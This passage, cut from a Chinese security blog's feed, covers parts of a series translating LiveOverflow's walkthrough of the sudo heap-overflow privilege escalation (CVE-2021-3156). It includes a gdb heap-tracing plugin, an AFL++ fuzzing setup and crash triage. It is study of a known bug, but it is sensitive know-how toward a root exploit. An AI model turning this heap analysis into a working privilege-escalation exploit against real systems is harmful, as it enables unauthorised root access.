class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># persist &quot;database&quot; to the file</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">j</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/tmp/malloc.json&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(json.dumps(j))</span><br><span class="line"></span><br><span class="line"><span class="comment"># load &quot;database&quot; from the file</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/tmp/malloc.json&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        j = json.loads(f.read())</span><br><span class="line">    <span class="keyword">return</span> j</span><br><span class="line"></span><br><span class="line"><span class="comment"># handler for malloc() breakpoints</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MallocBreakpoint</span>(gdb.Breakpoint):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, location, *args, **kwargs</span>):</span><br><span class="line">        <span class="built_in">super</span>(MallocBreakpoint, self).__init__(location, gdb.BP_BREAKPOINT, internal=<span class="literal">False</span>)</span><br><span class="line">        self.silent = <span class="literal">True</span></span><br><span class="line">        self.size = <span class="literal">None</span></span><br><span class="line">        self.addr = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># malloc() breakpoint triggered</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">stop</span>(<span class="params">self</span>):</span><br><span class="line">        log = &#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># extract information about this malloc()</span></span><br><span class="line">        log[<span class="string">&quot;size&quot;</span>] = get_register(<span class="string">&quot;$rdi&quot;</span>)</span><br><span class="line">        log[<span class="string">&quot;rip&quot;</span>] = get_register(<span class="string">&quot;$rip&quot;</span>)</span><br><span class="line">        log[<span class="string">&quot;backtrace&quot;</span>] = gdb.execute(<span class="string">&#x27;bt&#x27;</span>, to_string=<span class="literal">True</span>)</span><br><span class="line">        log[<span class="string">&#x27;name&#x27;</span>] = gdb.newest_frame().older().name()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># set a breakpoint at the malloc() return</span></span><br><span class="line">        <span class="keyword">if</span> log[<span class="string">&#x27;name&#x27;</span>] <span class="keyword">and</span> <span class="string">&#x27;set_cmnd&#x27;</span> <span class="keyword">in</span> log[<span class="string">&#x27;name&#x27;</span>]:</span><br><span class="line">            self.retbp = MallocReturnBreakpoint(log=log, overwrite=gdb.newest_frame().older())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        self.retbp = MallocReturnBreakpoint(log=log)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># breakpoint for the return of a malloc()</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MallocReturnBreakpoint</span>(gdb.FinishBreakpoint):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, log, overwrite=<span class="literal">False</span>, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> overwrite:</span><br><span class="line">            overwrite = gdb.newest_frame()</span><br><span class="line">        <span class="built_in">super</span>(MallocReturnBreakpoint, self).__init__(overwrite, internal=<span class="literal">False</span>)</span><br><span class="line">        self.silent = <span class="literal">False</span></span><br><span class="line">        self.log = log</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">stop</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># extract some information</span></span><br><span class="line">        self.log[<span class="string">&#x27;addr&#x27;</span>] = get_register(<span class="string">&quot;$rax&quot;</span>)</span><br><span class="line">        self.log[<span class="string">&#x27;name&#x27;</span>] = gdb.newest_frame().name()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># load the mallocs() we logged before</span></span><br><span class="line">        MALLOCS = load()</span><br><span class="line">        <span class="comment"># add this malloc to the known allocations</span></span><br><span class="line">        MALLOCS[<span class="built_in">str</span>(self.log[<span class="string">&#x27;addr&#x27;</span>])] = self.log</span><br><span class="line">        dump(MALLOCS)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># this is the location of our overflowing buffer</span></span><br><span class="line">        <span class="comment"># now we can dump the heap analysis</span></span><br><span class="line">        <span class="keyword">if</span> self.log[<span class="string">&#x27;name&#x27;</span>] <span class="keyword">and</span> <span class="string">&#x27;set_cmnd&#x27;</span> <span class="keyword">in</span> self.log[<span class="string">&#x27;name&#x27;</span>]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;YYYYYYYYYYY WE ARE IN!!!&quot;</span>)</span><br><span class="line">            addr = get_register(<span class="string">&quot;$rax&quot;</span>)</span><br><span class="line">            mallocs = [<span class="built_in">int</span>(a) <span class="keyword">for</span> a <span class="keyword">in</span> MALLOCS]</span><br><span class="line">            mallocs.sort()</span><br><span class="line">            SHOW = <span class="number">5</span></span><br><span class="line">            out = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> mall <span class="keyword">in</span> mallocs:</span><br><span class="line">                <span class="keyword">if</span> mall &gt; addr <span class="keyword">and</span> SHOW&gt;<span class="number">0</span>:</span><br><span class="line">                    h = MALLOCS[<span class="built_in">str</span>(mall)]</span><br><span class="line">                    <span class="keyword">for</span> line <span class="keyword">in</span> h[<span class="string">&#x27;backtrace&#x27;</span>].split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">1</span>:]:</span><br><span class="line">                        <span class="keyword">if</span> line:</span><br><span class="line">                            l = line.split()</span><br><span class="line">                            <span class="built_in">print</span>(l)</span><br><span class="line">                            <span class="keyword">if</span> l[<span class="number">3</span>] != <span class="string">&#x27;??&#x27;</span>:</span><br><span class="line">                                out += (l[<span class="number">3</span>]) + <span class="string">&quot; &quot;</span></span><br><span class="line">                    out += <span class="string">&quot;\n&quot;</span></span><br><span class="line">                    SHOW -= <span class="number">1</span></span><br><span class="line">            out += <span class="string">&quot;\n&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(out)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/tmp/heap&#x27;</span> ,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(out)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># set a breakpoint on free()</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FreeBreakpoint</span>(gdb.Breakpoint):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, location, *args, **kwargs</span>):</span><br><span class="line">        <span class="built_in">super</span>(FreeBreakpoint, self).__init__(location, gdb.BP_BREAKPOINT, internal=<span class="literal">False</span>)</span><br><span class="line">        self.silent = <span class="literal">True</span></span><br><span class="line">        self.size = <span class="literal">None</span></span><br><span class="line">        self.malloc = []</span><br><span class="line">        self.addr = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">stop</span>(<span class="params">self</span>):</span><br><span class="line">        log = &#123;&#125;</span><br><span class="line">        log[<span class="string">&quot;addr&quot;</span>] = get_register(<span class="string">&quot;$rdi&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># check if the memory freed was allocated before</span></span><br><span class="line">        MALLOCS = load()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(log[<span class="string">&quot;addr&quot;</span>]) <span class="keyword">in</span> MALLOCS:</span><br><span class="line">            <span class="comment"># remove this object from the list of allocated objects</span></span><br><span class="line">            <span class="keyword">del</span> MALLOCS[<span class="built_in">str</span>(log[<span class="string">&quot;addr&quot;</span>])]</span><br><span class="line">            dump(MALLOCS)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># the gdb command that starts the heap trace</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SudoeditCommand</span>(<span class="title class_ inherited__">GenericCommand</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Tracks a function given in parameter for arguments and return code.&quot;&quot;&quot;</span></span><br><span class="line">    _cmdline_ = <span class="string">&quot;sudoedit&quot;</span></span><br><span class="line">    _syntax_ = <span class="string">f&quot;<span class="subst">&#123;_cmdline_&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_invoke</span>(<span class="params">self, args</span>):</span><br><span class="line">        dump(&#123;&#125;)</span><br><span class="line">        self.bkps = []</span><br><span class="line">        <span class="comment"># set the breakpoints</span></span><br><span class="line">        self.bkps.append(MallocBreakpoint(location=<span class="string">&quot;__libc_malloc&quot;</span>))</span><br><span class="line">        self.bkps.append(FreeBreakpoint(location=<span class="string">&quot;__libc_free&quot;</span>))</span><br><span class="line">        <span class="comment">#self.bkps.append(MallocBreakpoint(location=&quot;malloc&quot;))</span></span><br><span class="line">        <span class="comment">#self.bkps.append(ReallocBreakpoint(location=&quot;__libc_calloc&quot;))</span></span><br><span class="line">        <span class="comment">#self.bkps.append(ReallocBreakpoint(location=&quot;__libc_realloc&quot;))</span></span><br><span class="line">        <span class="comment">#self.bkps.append(FreeBreakpoint(location=&quot;free&quot;))</span></span><br><span class="line"></span><br><span class="line">        gdb.events.exited.connect(self.cleanup)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">cleanup</span>(<span class="params">self, events</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;CLEANUP!!!&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> bp <span class="keyword">in</span> self.bkps:</span><br><span class="line">            bp.delete()</span><br><span class="line">        gdb.events.exited.disconnect(self.cleanup)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    register_external_command(SudoeditCommand())</span><br></pre></td></tr></table></figure><p>设置插件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -ex &#x27;gef config gef.extra_plugins_dir &quot;/pwd/gef2&quot;&#x27; -ex &#x27;gef save&#x27; -ex quit</span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -ex &#x27;set breakpoint pending on&#x27; -ex &#x27;sudoedit&#x27; -ex &#x27;r -s xxxxxxxxxxxxxxxxxx&#x27; -ex &#x27;sudoedit&#x27; -ex &#x27;continue&#x27; /usr/local/bin/sudoedit | tee heap.log</span><br></pre></td></tr></table></figure><p>主要就是跟踪<code>malloc</code>和<code>free</code>在堆溢出之后的行为</p><p><img src="https://img.joe1sn.top/uploads/big/e672b987fc044881b8c2552c9cf2fb30.png" alt="image-20220415204128487" /></p><p>只有将这个改写到暴力脚本里面，找到符合条件的Chunk</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;sudo堆溢出提权从fuzz到exp-3&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#sudo堆溢出提权从fuzz到exp-3&quot;&gt;&lt;/a&gt; SUDO堆溢出提权：从fuzz到exp [3]&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;前文：&lt;a href=&quot;https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/&quot;&gt;https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;受到youtuber：LiveOverflow的系列教程的启发，我发现在中文互联网上并没有相关的翻译教程，所以我想以实验报告的形式来创造这个从fuzz到exp的系列图文教程&lt;/p&gt;
&lt;p&gt;原始视频合集：&lt;a href=&quot;https://www.youtube.com/watch?v=uj1FTiczJSE&amp;amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx&quot;&gt;https://www.youtube.com/watch?v=uj1FTiczJSE&amp;amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;原始Blog：&lt;a href=&quot;https://liveoverflow.com/why-pick-sudo-research-target-part-1/&quot;&gt;https://liveoverflow.com/why-pick-sudo-research-target-part-1/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;原作者代码仓库：&lt;a href=&quot;https://github.com/LiveOverflow/pwnedit&quot;&gt;https://github.com/LiveOverflow/pwnedit&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="CVE" scheme="https://joe1sn.eu.org/categories/CVE/"/>
    
    
    <category term="CVE" scheme="https://joe1sn.eu.org/tags/CVE/"/>
    
    <category term="fuzz" scheme="https://joe1sn.eu.org/tags/fuzz/"/>
    
  </entry>
  
  <entry>
    <title>SUDO堆溢出提权：从fuzz到exp [2]</title>
    <link href="https://joe1sn.eu.org/2022/04/13/sudo-fuzz2exp-2/"/>
    <id>https://joe1sn.eu.org/2022/04/13/sudo-fuzz2exp-2/</id>
    <published>2022-04-13T03:12:03.000Z</published>
    <updated>2022-09-20T08:04:42.490Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sudo堆溢出提权从fuzz到exp-2"><a class="markdownIt-Anchor" href="#sudo堆溢出提权从fuzz到exp-2"></a> SUDO堆溢出提权：从fuzz到exp [2]</h1><blockquote><p>前文：<a href="https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/">https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/</a></p><p>受到youtuber：LiveOverflow的系列教程的启发，我发现在中文互联网上并没有相关的翻译教程，所以我想以实验报告的形式来创造这个从fuzz到exp的系列图文教程</p><p>原始视频合集：<a href="https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx">https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx</a></p><p>原始Blog：<a href="https://liveoverflow.com/why-pick-sudo-research-target-part-1/">https://liveoverflow.com/why-pick-sudo-research-target-part-1/</a></p><p>原作者代码仓库：<a href="https://github.com/LiveOverflow/pwnedit">https://github.com/LiveOverflow/pwnedit</a></p></blockquote><span id="more"></span><blockquote><p>My previous blog: <a href="https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/">https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/</a></p><p>I was inspired by the LiveOverflow’s Sudo Vulnerability Walkthrough on youtube, but i found there’s no Chinese version of this walkthrough tutorial, so i decided to write in experimental report way to create this “from fuzz to exploit” series.</p><p>Original Videos: <a href="https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx">https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx</a></p><p>Original Blog: <a href="https://liveoverflow.com/why-pick-sudo-research-target-part-1/">https://liveoverflow.com/why-pick-sudo-research-target-part-1/</a></p><p>Source Project Code: <a href="https://github.com/LiveOverflow/pwnedit">https://github.com/LiveOverflow/pwnedit</a></p></blockquote><hr /><blockquote><p>本节内容：</p><p>Troubleshooting AFL Fuzzing Problems | Ep. 03</p><p>Finding Buffer Overflow with Fuzzing | Ep. 04</p><p>Found a Crash Through Fuzzing? Minimize AFL Testcases! | Ep. 05</p><p>Root Cause Analysis With AddressSanitizer (ASan) | Ep. 06</p><p>Understanding C Pointer Magic Arithmetic | Ep. 07</p><p>C Code Review - Reaching Vulnerable Code in sudo | Ep. 08</p></blockquote><h1 id="解决afl的小麻烦"><a class="markdownIt-Anchor" href="#解决afl的小麻烦"></a> 解决AFL的小麻烦</h1><p>因为时间原因，我并不能一直开着电脑跑，不过我翻译一下作者遇到的问题</p><h2 id="no-more-free-cpu-cores"><a class="markdownIt-Anchor" href="#no-more-free-cpu-cores"></a> No more free CPU cores</h2><p>作者在遇到fuzz很慢的时候，尝试关闭一个fuzz，然后重启</p><p><img src="https://liveoverflow.com/content/images/2021/05/nomorecores.gif" alt="" /></p><p>然后使用<code>ps aux</code>产看全部运行过程，发现afl在尝试fuzz这些奇怪的东西（因为sudo中可能会有<code>exec</code>之类的）。然后<code>pkill vi</code>关闭所有vi的进程就短暂的解决了这个问题。</p><p>**解决：**彻底解决的话要关闭所有在sudo中的<code>exec</code>相关函数，然后重新编译</p><p><img src="https://liveoverflow.com/content/images/2021/05/exec.gif" alt="" /></p><h2 id="and-of-disk-space"><a class="markdownIt-Anchor" href="#and-of-disk-space"></a> And of Disk Space</h2><p><img src="https://liveoverflow.com/content/images/2021/05/nodiskspace.gif" alt="Today's surprising error message: we ran out of disk space overnight!" /></p><p>作者查看空间使用情况过后发现磁盘空间充足，但是任然不能创建文件</p><p>但是使用<code>df -i</code>查看inode节点，发现被占满了</p><blockquote><p>**inode (index node)**是指在许多“类<a href="https://zh.wikipedia.org/wiki/Unix">Unix</a><a href="https://zh.wikipedia.org/wiki/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F">文件系统</a>”中的一种<a href="https://zh.wikipedia.org/wiki/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84">数据结构</a>，用于描述<a href="https://zh.wikipedia.org/wiki/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F">文件系统</a>对象（包括<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%96%87%E4%BB%B6">文件</a>、<a href="https://zh.wikipedia.org/wiki/%E7%9B%AE%E5%BD%95_(%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F)">目录</a>、<a href="https://zh.wikipedia.org/wiki/%E8%AE%BE%E5%A4%87%E6%96%87%E4%BB%B6">设备文件</a>、<a href="https://zh.wikipedia.org/wiki/Unix%E5%9F%9F%E5%A5%97%E6%8E%A5%E5%AD%97">socket</a>、<a href="https://zh.wikipedia.org/wiki/%E7%AE%A1%E9%81%93_(Unix)">管道</a>等）。每个inode保存了<a href="https://zh.wikipedia.org/wiki/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F">文件系统</a>对象数据的属性和磁盘块位置[<a href="https://zh.wikipedia.org/wiki/Inode#cite_note-1">1]</a>。<a href="https://zh.wikipedia.org/wiki/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F">文件系统</a>对象属性包含了各种<a href="https://zh.wikipedia.org/wiki/%E5%85%83%E6%95%B0%E6%8D%AE">元数据</a>（如：最后修改时间） ，也包含用户组（owner ）和权限数据</p></blockquote><p>说明有过多的细小文件使用光了inode节点号，最后在<code>/var/tmp</code>找到了这些文件，原因是fuzz的时候产生了例如<code>../../</code>的路径穿越。</p><p>**解决：**手动在sudo要创建文件的时候添加上一个crash，这里用空指针引用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;mk tmp file(%s)\n&quot;</span>,stuff);</span><br><span class="line">*(<span class="type">int</span> *)<span class="number">0</span>=<span class="number">0</span>;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/fe3413067a7b9f99e3ba021c607a1e81.png" alt="image-20220413123850967" /></p><p><img src="https://img.joe1sn.top/uploads/big/7f09bcfe84615c2aef0120d62a5796cd.png" alt="image-20220413125559550" /></p><p>之后开始fuzz</p><p><img src="https://img.joe1sn.top/uploads/big/e7e313c41387799a8863c6bab6748943.png" alt="image-20220413130155444" /></p><p>然后分析crash</p><p><img src="https://img.joe1sn.top/uploads/big/598831b472a33be0f627555aec16b7d4.png" alt="image-20220413132119763" /></p><p>但是又引入了新的问题：</p><p><strong>root和普通用户相同吗？</strong></p><p>这里就要说到sudo的原理，sudo是通过在root条件下使用<code>setuid</code>的方式来让普通用户指令得到root执行。</p><p>比如我们在<code>user</code>下fuzz，但是真实情况会将它变为<code>root</code>下运行</p><p><img src="https://img.joe1sn.top/uploads/big/f1512d8ce661b5bd34be5512d0087838.png" alt="image-20220413130808491" /></p><p>如果要在fuzz时实现真实情况的效果，那么就要将当前用户uid设置为普通用户的</p><p><code>sudo-1.8.31p2/src/sudo.c get_user_info</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ud-&gt;uid = <span class="number">1000</span><span class="comment">//getuid();</span></span><br><span class="line">ud-&gt;euid = geteuid();</span><br><span class="line">ud-&gt;gid = <span class="number">1000</span><span class="comment">//getgid();</span></span><br><span class="line">ud-&gt;egid = getegid();</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/7e0f59e187a13a0777663e9347639af0.png" alt="image-20220413131502294" /></p><p><s>忘写分号了</s></p><p><img src="https://img.joe1sn.top/uploads/big/b074e3080f25b0d667b7c7e6fb7cc860.png" alt="image-20220413132555058" /></p><h1 id="找到缓冲区溢出"><a class="markdownIt-Anchor" href="#找到缓冲区溢出"></a> 找到缓冲区溢出</h1><p>作者用上一节的fuzz得到了一些ctash样本，本章内容讲的基本上是分析这些样本</p><h2 id="gdb调试"><a class="markdownIt-Anchor" href="#gdb调试"></a> gdb调试</h2><p>和我预料的一样，这样做会产生大量的非<code>sudo</code>从而crash的样本，可以用以下命令查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep -R sudoedit file_floder/</span><br><span class="line">grep -R sudo file_floder/</span><br></pre></td></tr></table></figure><p>为了方便分析，可以安装一些gdb的插件，如<code>pwndbg</code>，也在<a href="https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/">CVE分析的文章</a>里讲过了该插件的安装(不要放在共享文件夹<code>/pwd</code>下安装)</p><p>有的crash是由于fuzzer的错误引起的，作者使用了这段代码判断</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;argv-fuzz-inl.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[], <span class="type">char</span> *envp[])</span></span><br><span class="line">&#123;</span><br><span class="line">AFL_INIT_ARGV(); <span class="comment">// argv is now the fake argv</span></span><br><span class="line">    execve(<span class="string">&quot;/usr/local/bin/sudo&quot;</span>, argv, envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>作者遇到的第一个问题是<code>argv-fuzz-inl</code>中的<code>ret</code>数组造成的栈溢出，覆写了其他的函数指针造成crash</p><p><img src="https://img.joe1sn.top/uploads/big/208250c8cc25a075605053752bfa3e33.png" alt="image-20220413134205097" /></p><p><strong>解决</strong> 如果<code>rc</code>比最大参数数量大时退出循环</p><p><img src="https://img.joe1sn.top/uploads/big/bcce29acd287179264e9079b3e8a078b.png" alt="image-20220413134751535" /></p><h2 id="更换fuzzer"><a class="markdownIt-Anchor" href="#更换fuzzer"></a> 更换fuzzer</h2><p>使用更好的fuzzer：AFL++ 项目地址：<a href="https://github.com/AFLplusplus/AFLplusplus">https://github.com/AFLplusplus/AFLplusplus</a></p><p>AFL++支持对命令行的fuzz，所以之前的修改要去掉</p><p>要新建镜像的话，可以在Dockerfile中加上</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cd</span> /root/ &amp;&amp; git <span class="built_in">clone</span> https://github.com/AFLplusplus/AFLplusplus &amp;&amp; <span class="built_in">cd</span> AFLplusplus &amp;&amp; make source-only &amp;&amp; make install</span></span><br></pre></td></tr></table></figure><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">20.04</span></span><br><span class="line"><span class="keyword">ENV</span> LC_CTYPE C.UTF-<span class="number">8</span></span><br><span class="line"><span class="keyword">ARG</span> DEBIAN_FRONTEND=noninteractive</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; apt-get install -yq gcc make wget curl git vim gdb clang llvm lld llvm-dev bsdmainutils libstdc++-10-dev python3 python3-pip python3-dev automake flex bison build-essential libglib2.0-dev libpixman-1-dev python3-setuptools </span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cd</span> /root/ &amp;&amp; wget https://www.sudo.ws/dist/sudo-1.8.31p2.tar.gz &amp;&amp; tar -xvf sudo-1.8.31p2.tar.gz &amp;&amp; <span class="built_in">cd</span> sudo-1.8.31p2 &amp;&amp; ./configure &amp;&amp; make &amp;&amp; make install</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cd</span> /root/ &amp;&amp; git <span class="built_in">clone</span> https://github.com/AFLplusplus/AFLplusplus &amp;&amp; <span class="built_in">cd</span> AFLplusplus &amp;&amp; make source-only &amp;&amp; make install</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> useradd -ms /bin/bash user</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&#x27;export PS1=&quot;\[\e]0;\u@\h: \w\a\]\[\033[01;31m\]\u\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]# &quot;&#x27;</span> &gt;&gt; /root/.bashrc</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&#x27;export PS1=&quot;\[\e]0;\u@\h: \w\a\]\[\033[01;32m\]\u\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]$ &quot;&#x27;</span> &gt;&gt; /home/user/.bashrc</span></span><br><span class="line"><span class="keyword">USER</span> <span class="keyword">user</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /home/user</span></span><br></pre></td></tr></table></figure><p>重新编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whereis afl-clang-fast</span><br><span class="line">ls -lah /usr/local/bin/afl-clang-fast</span><br><span class="line">CC=afl-cc ./configure --disable-shared &amp;&amp; make -j8</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/2274e530d0cad0978349510ad0d5b73f.png" alt="image-20220413150943670" /></p><p>开始fuzz，指令<code>-T</code>参数可以指定<code>argv[0]</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i /tmp/in/ -o /tmp/out/ -T sudoedit ./src/sudo</span><br></pre></td></tr></table></figure><p>我这里故意放了能够引起crash的样本进去只为了加速过程</p><p><img src="https://img.joe1sn.top/uploads/big/472972f2b18e905df2f043c940558cb4.png" alt="image-20220413162529243" /></p><h1 id="分析新的crash"><a class="markdownIt-Anchor" href="#分析新的crash"></a> 分析新的crash</h1><h2 id="判断是否为误报"><a class="markdownIt-Anchor" href="#判断是否为误报"></a> 判断是否为误报</h2><p>我直接使用作者的crash文件，你可以在：<a href="https://github.com/LiveOverflow/pwnedit/tree/main/episode05">https://github.com/LiveOverflow/pwnedit/tree/main/episode05</a> 中找到</p><p><code>id_000000,sig_06,src_000083+000451,time_23448104,op_splice,rep_8</code></p><p>​<img src="https://img.joe1sn.top/uploads/big/6f8de69e488e04c88c10bafce2b57c21.png" alt="image-20220413162911500" /></p><p>检验下在我的环境里面是否会有crash</p><p>root</p><p><img src="https://img.joe1sn.top/uploads/big/265397d0da23f6a809df1c35c9e5d286.png" alt="image-20220413163015370" /></p><p>user</p><p><img src="https://img.joe1sn.top/uploads/big/0ade7d1c969da3dbb611172d78451e41.png" alt="image-20220413164830186" /></p><h2 id="gdb调试-2"><a class="markdownIt-Anchor" href="#gdb调试-2"></a> gdb调试</h2><p>原视频里面用的是<code>GEF</code>，这里我用<code>pwndbg</code>，新人(没有CTFpwn经验)建议用GEF</p><p><img src="https://img.joe1sn.top/uploads/big/7b80528f9a373af973d627b2a2ca6ae8.png" alt="image-20220413165152014" /></p><p>程序自动运行后停止了</p><p><img src="https://img.joe1sn.top/uploads/big/13b36fd977fb17e39124b2afe6aab95d.png" alt="image-20220413165314583" /></p><p>说明这个错误是被<code>malloc</code>给抛出的</p><p>**这会是一个新的0day吗？**在最新平台上测试后发现并不是</p><h2 id="简化crash"><a class="markdownIt-Anchor" href="#简化crash"></a> 